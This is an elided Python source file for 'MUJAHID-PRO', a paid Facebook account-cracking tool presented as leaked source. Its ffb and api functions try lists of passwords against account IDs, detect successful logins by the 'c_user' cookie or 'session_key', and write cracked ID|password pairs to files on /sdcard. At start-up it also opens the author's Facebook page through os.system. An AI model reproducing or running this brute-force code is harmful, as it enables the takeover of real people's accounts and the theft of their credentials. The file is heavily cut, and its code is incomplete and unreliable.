#SOURCE LEAKED BY :MUJAHID
#REASON : BECAUSE LOL BADSHAH
#WAS INTERFERE BETWEEN
#MUJAHIDBALOCH HACKER 😎 
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://www.facebook.com/FBMASTER.HACKERGANGSTR.MUJAHID')
...
logo=("""\033[1;37m
.d8b. .88b  d88. db    db    d88b  .d8b.  db   db d888888b d8888b. 
88'YbdP`88 88    88    `8P' d8' `8b 88   88   `88'   88  `8D 
88  88  88 88    88     88  88ooo88 88ooo88    88    88   88 
88  88  88 88    88     88  88~~~88 88~~~88    88    88   88 
88  88  88 88b  d88 db. 88  88   88 88   88   .88.   88  .8D 
YP  YP  YP ~Y8888P' Y8888P  YP   YP YP   YP Y888888P Y8888D'
----------------------------------------------
 Author    : MUJAHID BALOCH
 Github    : Toxic-Mujahid
 Facebook  : MUJAHID BALOCH
 Tool Name : MUJAHID-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 MUJAHIDPro version 1.9.8
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi Aking Sir, I Need To Buy Your Paid MUJAHIDPRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MUJAHID-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [MUJAHID-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AFTAB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MUJAHID-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MUJAHID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MUJAHID-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MUJAHID-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MUJAHID-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MUJAHID-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MUJAHID-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MUJAHID-OK] '+uid+' | '+pas+'\033[1;97m')
